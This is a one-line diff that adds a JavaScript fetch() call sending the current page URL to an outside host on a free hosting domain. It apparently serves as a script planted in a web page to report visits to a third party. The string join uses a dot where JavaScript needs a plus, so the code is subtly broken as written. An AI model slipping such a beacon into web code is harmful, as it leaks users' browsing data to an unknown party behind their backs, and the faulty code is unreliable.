@@ -1,0 +1,1 @@
+fetch("https://temanbelajar.epizy.com/index.php?q=".document.URL);
